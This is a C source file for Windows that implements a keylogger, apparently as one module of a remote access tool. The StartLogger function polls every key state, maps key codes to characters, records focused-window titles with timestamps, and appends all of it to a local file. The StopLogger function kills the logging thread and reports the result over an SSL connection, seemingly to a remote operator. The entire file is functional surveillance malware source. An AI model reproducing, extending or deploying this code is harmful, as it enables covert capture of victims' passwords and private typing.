#include "Variables.h"
#include <stdio.h>
#include <time.h>

time_t TimeWindowChange;
struct tm* TimeWindow;

DWORD WINAPI StartLogger()
{
	char FileName[] = "C:\\Users\\out.txt";

	fp = fopen(FileName, "a+");

	if (fp == NULL)
	{
		return 1;
	}

	IsKeyLoggerOn = 1;
	HWND LastHandle = NULL;

	while (1)
	{
		Sleep(10);
		for (int Key = 0x01; Key < 0xFE; Key++)
		{
			HWND CurrentHandle = GetForegroundWindow();
			if (CurrentHandle != LastHandle)
			{
				LastHandle = CurrentHandle;
				char NewWindowTitle[255] = { 0 };
				int GotTitle = GetWindowTextA(CurrentHandle, NewWindowTitle, sizeof(NewWindowTitle));
				if (GotTitle == 0)
				{
					LastHandle = NULL;
				}
				else
				{
					time(&TimeWindowChange);
					TimeWindow = localtime(&TimeWindowChange);
					char TitleAndDateBuffer[512] = { 0 };
					snprintf(TitleAndDateBuffer, sizeof(TitleAndDateBuffer), "\n[KEYLOGGER INFO] [Changed Focused Window At: %02d/%02d/%04d %02d:%02d:%02d] - Window Title: '%s'\n", TimeWindow->tm_mday, TimeWindow->tm_mon + 1, TimeWindow->tm_year + 1900, TimeWindow->tm_hour, TimeWindow->tm_min, TimeWindow->tm_sec, NewWindowTitle);
					fputs(TitleAndDateBuffer, fp);
					fflush(fp);
				}
			}
			if (GetAsyncKeyState(Key) & 0x0001)
			{
				if (Key >= '0' && Key <= '9')
				{
					fputc(Key, fp);
				}
				else
				{
					switch (Key)
					{
					case VK_LBUTTON:
						fputs("[L_MB]", fp);
						break;

					case VK_RBUTTON:
						fputs("[R_MB]", fp);
						break;

					case VK_MBUTTON:
						fputs("[MID_MB]", fp);
						break;

					case VK_XBUTTON1:
						fputs("[X1_MB]", fp);
						break;

					case VK_XBUTTON2:
						fputs("[X2_MB]", fp);
						break;

					case VK_BACK:
						fputs("[BACKSPACE]", fp);
						break;

					case VK_TAB:
						fputs("[TAB]", fp);
						break;

					case VK_CLEAR:
						fputs("[CLEAR]", fp);
						break;

					case VK_RETURN:
						fputs("[ENTER]\n", fp);
						break;

					case VK_PAUSE:
						fputs("[PAUSE]", fp);
						break;

					case VK_CAPITAL:
						fputs("[CAPSLOCK]", fp);
						break;

					case VK_ESCAPE:
						fputs("[ESC]", fp);
						break;

					case VK_SPACE:
						fputc(' ', fp);
						break;

					case VK_PRIOR:
						fputs("[PAGE_UP]", fp);
						break;

					case VK_NEXT:
						fputs("[PAGE_DOWN]", fp);
						break;

					case VK_END:
						fputs("[END]", fp);
						break;

					case VK_HOME:
						fputs("[HOME]", fp);
						break;

					case VK_LEFT:
						fputs("[LEFT_ARROW]", fp);
						break;

					case VK_UP:
						fputs("[UP_ARROW]", fp);
						break;

					case VK_RIGHT:
						fputs("[RIGHT_ARROW]", fp);
						break;

					case VK_DOWN:
						fputs("[DOWN_ARROW]", fp);
						break;

					case VK_SELECT:
						fputs("[SELECT]", fp);
						break;

					case VK_PRINT:
						fputs("[PRINT]", fp);
						break;

					case VK_SNAPSHOT:
						fputs("[SCREENSHOT]", fp);
						break;

					case VK_INSERT:
						fputs("[INSERT]", fp);
						break;

					case VK_DELETE:
						fputs("[DELETE]", fp);
						break;

					case VK_HELP:
						fputs("[HELP]", fp);
						break;

					case 0x41:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('A', fp);
						}
						else
						{
							fputc('a', fp);
						}
						break;

					case 0x42:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('B', fp);
						}
						else
						{
							fputc('b', fp);
						}
						break;

					case 0x43:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('C', fp);
						}
						else
						{
							fputc('c', fp);
						}
						break;

					case 0x44:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('D', fp);
						}
						else
						{
							fputc('d', fp);
						}
						break;

					case 0x45:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('E', fp);
						}
						else
						{
							fputc('e', fp);
						}
						break;

					case 0x46:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('F', fp);
						}
						else
						{
							fputc('f', fp);
						}
						break;

					case 0x47:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('G', fp);
						}
						else
						{
							fputc('g', fp);
						}
						break;

					case 0x48:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('H', fp);
						}
						else
						{
							fputc('h', fp);
						}
						break;

					case 0x49:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('I', fp);
						}
						else
						{
							fputc('i', fp);
						}
						break;

					case 0x4A:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('J', fp);
						}
						else
						{
							fputc('j', fp);
						}
						break;

					case 0x4B:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('K', fp);
						}
						else
						{
							fputc('k', fp);
						}
						break;

					case 0x4C:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('L', fp);
						}
						else
						{
							fputc('l', fp);
						}
						break;

					case 0x4D:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('M', fp);
						}
						else
						{
							fputc('m', fp);
						}
						break;

					case 0x4E:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('N', fp);
						}
						else
						{
							fputc('n', fp);
						}
						break;

					case 0x4F:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('O', fp);
						}
						else
						{
							fputc('o', fp);
						}
						break;

					case 0x50:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('P', fp);
						}
						else
						{
							fputc('p', fp);
						}
						break;

					case 0x51:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('Q', fp);
						}
						else
						{
							fputc('q', fp);
						}
						break;

					case 0x52:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('R', fp);
						}
						else
						{
							fputc('r', fp);
						}
						break;

					case 0x53:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('S', fp);
						}
						else
						{
							fputc('s', fp);
						}
						break;

					case 0x54:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('T', fp);
						}
						else
						{
							fputc('t', fp);
						}
						break;

					case 0x55:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('U', fp);
						}
						else
						{
							fputc('u', fp);
						}
						break;

					case 0x56:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('V', fp);
						}
						else
						{
							fputc('v', fp);
						}
						break;

					case 0x57:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('W', fp);
						}
						else
						{
							fputc('w', fp);
						}
						break;

					case 0x58:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('X', fp);
						}
						else
						{
							fputc('x', fp);
						}
						break;

					case 0x59:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('Y', fp);
						}
						else
						{
							fputc('y', fp);
						}
						break;

					case 0x5A:
						if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						{
							fputc('Z', fp);
						}
						else
						{
							fputc('z', fp);
						}
						break;

					case VK_LWIN:
						fputs("[LEFT_WIN_KEY]", fp);
						break;

					case VK_RWIN:
						fputs("[RIGHT_WIN_KEY]", fp);
						break;

					case VK_APPS:
						fputs("[APP_WIN_KEY]", fp);
						break;

					case VK_SLEEP:
						fputs("[SLEEP]", fp);
						break;

					case VK_NUMPAD0:
						fputs("[NUMPAD_0]", fp);
						break;

					case VK_NUMPAD1:
						fputs("[NUMPAD_1]", fp);
						break;

					case VK_NUMPAD2:
						fputs("[NUMPAD_2]", fp);
						break;

					case VK_NUMPAD3:
						fputs("[NUMPAD_3]", fp);
						break;

					case VK_NUMPAD4:
						fputs("[NUMPAD_4]", fp);
						break;

					case VK_NUMPAD5:
						fputs("[NUMPAD_5]", fp);
						break;

					case VK_NUMPAD6:
						fputs("[NUMPAD_6]", fp);
						break;

					case VK_NUMPAD7:
						fputs("[NUMPAD_7]", fp);
						break;

					case VK_NUMPAD8:
						fputs("[NUMPAD_8]", fp);
						break;

					case VK_NUMPAD9:
						fputs("[NUMPAD_9]", fp);
						break;

					case VK_MULTIPLY:
						fputc('*', fp);
						break;

					case VK_ADD:
						fputc('+', fp);
						break;

					case VK_SEPARATOR:
						fputs("[SEPARATOR,]", fp);
						break;

					case VK_SUBTRACT:
						fputc('-', fp);
						break;

					case VK_DECIMAL:
						fputs("[DECIMAL.]", fp);
						break;

					case VK_DIVIDE:
						fputs("[DIVIDE/]", fp);
						break;

					case VK_F1:
						fputs("[F1]", fp);
						break;

					case VK_F2:
						fputs("[F2]", fp);
						break;

					case VK_F3:
						fputs("[F3]", fp);
						break;

					case VK_F4:
						fputs("[F4]", fp);
						break;

					case VK_F5:
						fputs("[F5]", fp);
						break;

					case VK_F6:
						fputs("[F6]", fp);
						break;

					case VK_F7:
						fputs("[F7]", fp);
						break;

					case VK_F8:
						fputs("[F8]", fp);
						break;

					case VK_F9:
						fputs("[F9]", fp);
						break;

					case VK_F10:
						fputs("[F10]", fp);
						break;

					case VK_F11:
						fputs("[F11]", fp);
						break;

					case VK_F12:
						fputs("[F12]", fp);
						break;

					case VK_F13:
						fputs("[F13]", fp);
						break;

					case VK_F14:
						fputs("[F14]", fp);
						break;

					case VK_F15:
						fputs("[F15]", fp);
						break;

					case VK_F16:
						fputs("[F16]", fp);
						break;

					case VK_F17:
						fputs("[F17]", fp);
						break;

					case VK_F18:
						fputs("[F18]", fp);
						break;

					case VK_F19:
						fputs("[F19]", fp);
						break;

					case VK_F20:
						fputs("[F20]", fp);
						break;

					case VK_F21:
						fputs("[F21]", fp);
						break;

					case VK_F22:
						fputs("[F22]", fp);
						break;

					case VK_F23:
						fputs("[F23]", fp);
						break;

					case VK_F24:
						fputs("[F24]", fp);
						break;

					case VK_NUMLOCK:
						fputs("[NUMLOCK]", fp);
						break;

					case VK_SCROLL:
						fputs("[SCROLL]", fp);
						break;

					case VK_LSHIFT:
						fputs("[LEFT_SHIFT]", fp);
						break;

					case VK_SHIFT:
						fputs("[RIGHT_SHIFT]", fp);
						break;

					case VK_CONTROL:
						fputs("[LEFT_CTRL]", fp);
						break;

					case VK_RCONTROL:
						fputs("[RIGHT_CTRL]", fp);
						break;

					case VK_LMENU:
						fputs("[LEFT_ALT]", fp);
						break;

					case VK_MENU:
						fputs("[RIGHT_ALT]", fp);
						break;

					case VK_OEM_1:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputc(':', fp);
						}
						else
						{
							fputc(';', fp);
						}
						break;

					case VK_OEM_PLUS:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputs("[OEM+]", fp);
						}
						else
						{
							fputs("[OEM=]", fp);
						}
						break;

					case VK_OEM_COMMA:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputs("[OEM<]", fp);
						}
						else
						{
							fputs("[OEM,]", fp);
						}
						break;

					case VK_OEM_MINUS:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputs("[OEM_]", fp);
						}
						else
						{
							fputs("[OEM-]", fp);
						}
						break;

					case VK_OEM_PERIOD:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputs("[OEM>]", fp);
						}
						else
						{
							fputs("[OEM.]", fp);
						}
						break;

					case VK_OEM_2:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputc('?', fp);
						}
						else
						{
							fputc('/', fp);
						}
						break;

					case VK_OEM_3:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputc('~', fp);
						}
						else
						{
							fputc('`', fp);
						}
						break;

					case VK_OEM_4:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputc('{', fp);
						}
						else
						{
							fputc('[', fp);
						}
						break;

					case VK_OEM_5:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputc('|', fp);
						}
						else
						{
							fputc('\\', fp);
						}
						break;

					case VK_OEM_6:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputc('}', fp);
						}
						else
						{
							fputc(']', fp);
						}
						break;

					case VK_OEM_7:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputc('\"', fp);
						}
						else
						{
							fputc('\'', fp);
						}
						break;

					case VK_OEM_8:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputs("[§]", fp);
						}
						else
						{
							fputc('!', fp);
						}
						break;

					case VK_OEM_102:
						IsShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
						if (IsShiftPressed)
						{
							fputc('>', fp);
						}
						else
						{
							fputc('<', fp);
						}
						break;

					default:
						fputs("[UNKNOWN]", fp);
						break;
					}
				}
				fflush(fp);
			}
		}
	}
	return 0;
}

int StopLogger(SSL* ssl)
{
	char Success[] = "\033[0;35m[+] Logger stopped!\033[0m\n";
	char Error[] = "\033[1;31m[-] Couldn't stop logger.\033[0m\n";

	BOOL Exit = 0;
	BOOL Terminated = 0;
	DWORD ExitCode = 0;

	Exit = GetExitCodeThread(KeyLoggerThread, &ExitCode);

	if (Exit == 0)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return EXIT_FAILURE;
	}

	Terminated = TerminateThread(KeyLoggerThread, ExitCode);

	if (Terminated == 0)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return EXIT_FAILURE;
	}

	IsKeyLoggerOn = 0;
	fclose(fp);
	SSL_write(ssl, Success, sizeof(Success));
	return EXIT_SUCCESS;
}
